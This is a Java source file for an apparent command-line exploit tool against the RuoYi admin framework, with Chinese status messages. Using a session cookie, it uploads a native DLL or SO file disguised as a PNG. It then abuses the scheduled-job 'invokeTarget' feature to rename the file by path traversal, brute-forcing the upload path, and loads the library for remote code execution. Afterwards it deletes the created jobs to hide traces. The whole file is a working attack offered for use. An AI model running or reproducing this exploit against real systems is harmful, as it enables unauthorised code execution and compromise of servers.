import com.alibaba.fastjson.JSON;
import com.github.kevinsawicki.http.HttpRequest;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Random;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ruoyiMain {
    public static HashMap head = new HashMap();
    public static Boolean flag = true;
    public static String[] hhh = null;

    public static void help(){
        System.out.println("[*] java -jar exp.jar -u url -c cookie -f exp.dll -p [path/pathFile] <-nr> <-h \"Referer:123\">");
        System.out.println("-u  --url  url地址");
        System.out.println("-c  --cookie   JSESSIONID=...");
        System.out.println("-f  --expFile  dll文件/so文件 的绝对路径");
        System.out.println("-p  --uploadPath  已知上传的路径 / 指定上传文件路径字典爆破");
        System.out.println("-h  --head  HTTP请求头");
        System.out.println("-nr --noRemoveJob  设置不删除任务");
        System.out.println("[*] java -jar exp.jar -u http://10.0.0.1 -c \"JSESSIONID=9926855b-7969-4504-b58f-a5f03b39b3fa\" -f \"E:/exp.dll\" -p \"E:/pathDic.txt\" -h \"csrf_token: 123\"");
    }

    public static void main(String[] args){
        CommandLine cmdLine = null;
        Options options = new Options();
        options.addOption("u", "url", true, "Url");
        options.addOption("c", "cookie", true, "Cookie");
        options.addOption("f", "expFile", true, "ExpFile");
        options.addOption("p", "uploadPath", true, "UploadPath");
        options.addOption("h","head",true,"Head");
        options.addOption("nr", "noRemoveJob", false, "NoRemoveJob");
        CommandLineParser parser = new DefaultParser();
        if(args.length < 8){
            help();
            System.exit(1);
        }
        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            help();
            System.exit(1);
        }
        if(cmdLine.hasOption("noRemoveJob")){
            flag = false;
        }
        if(cmdLine.hasOption("head")){
            hhh = cmdLine.getOptionValue("head").split(":");
            head.put(hhh[0],hhh[1]);
        }


        head.put("Cookie",cmdLine.getOptionValue("cookie"));


        renameFile(cmdLine.getOptionValue("url"),cmdLine.getOptionValue("expFile"),cmdLine.getOptionValue("uploadPath"));

    }

    public static String getRandomString(int length) {

        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            sb.append(characters.charAt(index));
        }

        return sb.toString();
    }
    public static void renameFile(String url,String filePath,String uploadpath){
        try {
            String jobName = getRandomString(10);
            String jobName1 = getRandomString(10);
            String file = upload(url, filePath);
            if (file == null) {
                return;
            }
            String[] env = env(url);
            System.out.println("[+] 当前jdk环境: " + env[0]);
            System.out.println("[+] 当前项目环境: " + env[1]);
            String type = env[0].startsWith("/") ? "so" : "dll";
            String newPath = env[0].startsWith("/") ? "../../../../../../../../../../../../../../../../../../../../../../../tmp/" : env[0].split(":")[0] + ":/Temp/";
            String filename = new File(file).getName().replace(".png", "." + type);
            String oldFile = file.replace("\\", "/");
            String newFile = newPath + filename;
            String newFileRun = env[0].startsWith("/") ? "../../../../../../../../../../../../../../../../../../../../../../../tmp/" + filename.replace("." + type, "") : "../../../../../../../../../../../../Temp/" + filename.replace("." + type, "");

            String data = "createBy=admin&jobName=" + jobName + "&jobGroup=DEFAULT&invokeTarget=ch.qos.logback.core.rolling.helper.RenameUtil.rename(%22" + oldFile + "%22%2C%22" + newFile + "%22)%3B&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark=";
            String dataList = "pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=" + jobName + "&jobGroup=&status=";
            HttpRequest request = HttpRequest.post(url + "/monitor/job/add").headers(head).send(data).trustAllHosts().trustAllCerts();
            if (request.body().contains("操作成功")) {
                HttpRequest request1 = HttpRequest.post(url + "/monitor/job/list").headers(head).send(dataList).trustAllHosts().trustAllCerts();
                String d1 = request1.body();
                String d2 = JSON.parseObject(d1).get("rows").toString().replace("[", "").replace("]", "");
                String d3 = JSON.parseObject(d2).get("jobId").toString();
                int jobId = Integer.parseInt(d3);
                int jobId1 = jobId + 1;
                String p = null;

                System.out.println("[+] jobId: " + jobId + "创建成功！");
                HttpRequest request3 = HttpRequest.post(url + "/monitor/job/run").headers(head).send("jobId=" + jobId).trustAllCerts().trustAllHosts();
                if (request3.body().contains("操作成功")) {
                    HttpRequest.post(url + "/monitor/job/list").headers(head).trustAllHosts().trustAllCerts();
                    System.out.println("[+] jobId: " + jobId + "执行完成！");
                    //find path

                    if ((uploadpath.contains("/") || uploadpath.contains("\\"))&&uploadpath.contains(".")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(uploadpath))) {
                            String line;
                            // 逐行读取文件内容
                            while ((line = reader.readLine()) != null) {
                                p = path(url, jobId + "", jobName, line, oldFile, newFile);
                                if (p != null) {
                                    break;
                                }
                            }
                        } catch (IOException e) {
                            System.err.println("[-] 读取" + uploadpath + "文件时出错");
                            removeJob(url,jobId);
                        }
                    } else {
                        p = path(url, jobId + "", jobName, uploadpath, oldFile, newFile);
                    }

                }

                if (p == null) {
                    System.out.println("[-] 未找到上传路径!");
                    removeJob(url,jobId);
                    System.exit(0);
                }

                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                String data1 = "createBy=admin&jobName=" + jobName1 + "&jobGroup=DEFAULT&invokeTarget=com.sun.glass.utils.NativeLibLoader.loadLibrary('" + newFileRun + "');&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&remark=";
                HttpRequest request4 = HttpRequest.post(url + "/monitor/job/add").headers(head).send(data1).trustAllHosts().trustAllCerts();
                if (request4.body().contains("操作成功")) {
                    System.out.println("[+] jobId: " + jobId1 + "创建成功！");
                    HttpRequest.post(url + "/monitor/job/list").headers(head).trustAllHosts().trustAllCerts();
                    HttpRequest request5 = HttpRequest.post(url + "/monitor/job/run").headers(head).send("jobId=" + (jobId1)).trustAllCerts().trustAllHosts();
                    if (request5.body().contains("操作成功")) {
                        HttpRequest.post(url + "/monitor/job/list").headers(head).trustAllHosts().trustAllCerts();
                        System.out.println("[+] jobId: " + jobId1 + "执行中！");

                        String data2 = "pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=" + jobName1 + "&jobGroup=&status=0&params%5BbeginTime%5D=&params%5BendTime%5D=";
                        HttpRequest request6 = HttpRequest.post(url + "/monitor/jobLog/list").headers(head).send(data2).trustAllHosts().trustAllCerts();
                        try {
                            Thread.sleep(1000);
                            String dd1 = request6.body();
                            String dd2 = JSON.parseObject(dd1).get("rows").toString().replace("[", "").replace("]", "");
                            JSON.parseObject(dd2).get("invokeTarget").toString();
                            System.out.println("[+] jobId: " + jobId1 + "的job执行成功！");
                        } catch (Exception e) {
                            System.out.println("[-] jobId: " + jobId1 + "的job执行失败！");

                        }

                    }
                    removeJob(url,jobId1);
                }
                removeJob(url,jobId);
            }
        }catch (Exception e){}
    }

    private static void removeJob(String url,int jobid){
        if(!flag){
            System.out.println("[!] jobId: "+jobid+"不进行删除!");
            return;
        }
        HttpRequest r = HttpRequest.post(url + "/monitor/job/remove").headers(head).send("ids=" + jobid).trustAllCerts().trustAllHosts();
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if(r.body().contains("操作成功")){
            System.out.println("[+] jobId: "+jobid+"删除成功!");
        }
    }

    private static String path(String url,String jobId,String jobName,String p,String oldFile,String newFile){
//        String data1 = "";
        try {
            System.out.println("[*] 正在fuzz路径: "+p);
//            p = p.startsWith("/") ? p.substring(1) : p;
            p = p.endsWith("/")||p.isEmpty() ? p : p + "/";
            String data1 = "jobId=" + jobId + "&updateBy=admin&jobName=" + jobName + "&jobGroup=DEFAULT&invokeTarget=ch.qos.logback.core.rolling.helper.RenameUtil.rename(%22" + p + oldFile + "%22%2C%22" + newFile + "%22)%3B&cronExpression=*+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=1&remark=";
            HttpRequest req1 = HttpRequest.post(url + "/monitor/job/edit").headers(head).send(data1).trustAllCerts().trustAllHosts();
            if (req1.body().contains("操作成功")) {
                HttpRequest.post(url + "/monitor/job/list").headers(head).trustAllHosts().trustAllCerts();

                Thread.sleep(1000);
                HttpRequest req2 = HttpRequest.post(url + "/monitor/job/run").headers(head).send("jobId=" + jobId).trustAllCerts().trustAllHosts();
                if (req2.body().contains("操作成功")) {
                    HttpRequest.post(url + "/monitor/job/list").headers(head).trustAllHosts().trustAllCerts();
                    //jobLog

                    String data2 = "pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=" + jobName + "&jobGroup=&status=0&params%5BbeginTime%5D=&params%5BendTime%5D=";
                    HttpRequest request1 = HttpRequest.post(url + "/monitor/jobLog/list").headers(head).send(data2).trustAllHosts().trustAllCerts();
                    Thread.sleep(1000);
                    String d1 = request1.body();
                    String d2 = JSON.parseObject(d1).get("rows").toString().replace("[", "").replace("]", "");
                    String d3 = JSON.parseObject(d2).get("invokeTarget").toString();



                    if (d3.contains(p + oldFile)) {
                        System.out.println("[+] 成功获取当前上级路径: " + p);
                        return p;
                    }
                }
            }
        }catch (Exception e){}
        return null;
    }


    private static String[] env(String url){
        HttpRequest request = HttpRequest.get(url+"/monitor/server").headers(head)
                .trustAllCerts().trustAllHosts();
        String html = request.body();
        String regex = "<td\\s+colspan=\"3\">(.*?)</td>";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(html);

        // 创建一个数组来保存匹配结果
        String[] paths = new String[3];
        int index = 0;

        // 查找所有匹配项
        while (matcher.find() && index < paths.length) {
            paths[index++] = matcher.group(1);
        }
        return paths;
    }

    private static String upload(String url,String filePath){


        String reponse = null;
        try {
            reponse = uploadFile(url+"/common/upload",filePath);
//            System.out.println(reponse);
            String p1 = JSON.parseObject(reponse).get("fileName").toString();
            System.out.println("[+] /common/upload上传文件"+p1+"成功！");
            String p2 = p1.replace("/profile/","");
            return p2;
        } catch (Exception e) {
            System.out.println("[-] /common/upload上传文件失败");
            try {
                reponse = uploadFile(url+"/system/user/profile/updateAvatar",filePath);
                if(reponse.contains("操作成功")){
                    HttpRequest r1 = HttpRequest.get(url+"/system/user/profile").headers(head).trustAllHosts().trustAllCerts();
                    String f1 = r1.body();
                    String f2 = f1.substring(f1.indexOf("<img class=\"img-circle img-lg\" src=\"")+36,f1.indexOf("\" onerror=\"this.src=&#39;/img/profile.jpg"));
                    System.out.println("[+] /system/user/profile/updateAvatar上传文件"+f2+"成功！");
                    String p2 = f2.replace("/profile/","");
                    return p2;
                }else{
                    System.out.println("[-] /system/user/profile/updateAvatar上传文件失败");
                }

            } catch (Exception ioException) {
                System.out.println("[-] /system/user/profile/updateAvatar上传文件失败");
            }

        }

        return null;

    }
    public static String uploadFile(String uploadUrl, String filePath) throws IOException {
        File file = new File(filePath);
        if (!file.exists()) {
            throw new FileNotFoundException("[-] 文件不存在: " + filePath);
        }

        // 生成随机边界字符串
        String boundary = "----" + UUID.randomUUID().toString().replace("-", "");
        String lineFeed = "\r\n";

        URL url = new URL(uploadUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
//
//        connection = (HttpURLConnection)url.openConnection(proxy);

        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Cookie",head.get("Cookie").toString());
        if(hhh!= null){
            connection.setRequestProperty(hhh[0],hhh[1]);
        }

        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "Java Client");

        try (OutputStream outputStream = connection.getOutputStream();
             PrintWriter writer = new PrintWriter(new OutputStreamWriter(outputStream, "UTF-8"), true)) {

            // 添加文件参数
            writer.append("--" + boundary).append(lineFeed);
            if(uploadUrl.contains("updateAvatar")){
                writer.append("Content-Disposition: form-data; name=\"avatarfile\"; filename=\"com.ruoyi.quartz.task.png\"").append(lineFeed);
                writer.append("Content-Type: application/octet-stream").append(lineFeed);
                writer.append("Content-Transfer-Encoding: binary").append(lineFeed);
            }else{
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"com.ruoyi.quartz.task.png\"").append(lineFeed);
                writer.append("Content-Type: application/octet-stream").append(lineFeed);
                writer.append("Content-Transfer-Encoding: binary").append(lineFeed);
            }

            writer.append(lineFeed);
//            writer.append("--" + boundary + "--").append(lineFeed);
            writer.flush();

            // 写入文件内容
            try (FileInputStream fileInputStream = new FileInputStream(file)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
                outputStream.flush();
            }
            writer.append(lineFeed);
            writer.append("--" + boundary+"--").append(lineFeed);
            writer.flush();
            // 添加其他表单参数示例
        }

        // 读取响应
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), "UTF-8"))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                return response.toString();
            }
        } else {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getErrorStream(), "UTF-8"))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                throw new IOException("HTTP错误码: " + responseCode + ", 错误信息: " + response.toString());
            }
        }
    }

}
